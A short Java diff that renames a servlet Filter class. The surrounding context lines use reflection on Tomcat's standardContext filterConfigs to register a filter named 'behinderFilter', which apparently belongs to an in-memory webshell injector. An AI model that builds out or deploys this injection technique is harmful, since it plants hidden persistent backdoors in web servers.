@@ -18,7 +18,7 @@ import java.util.Map;
  *
  * @author QI4L
  */
-public class TFMSFromThreadF implements Filter {
+public class TFMSFromThread implements Filter {
 
     public static String pattern;
 
@@ -55,7 +55,7 @@ public class TFMSFromThreadF implements Filter {
             Configs.setAccessible(true);
             Map filterConfigs = (Map) Configs.get(standardContext);
 
-            TFMSFromThreadF behinderFilter = new TFMSFromThreadF();
+            TFMSFromThread behinderFilter = new TFMSFromThread();
 
             FilterDef filterDef = new FilterDef();
             filterDef.setFilter(behinderFilter);
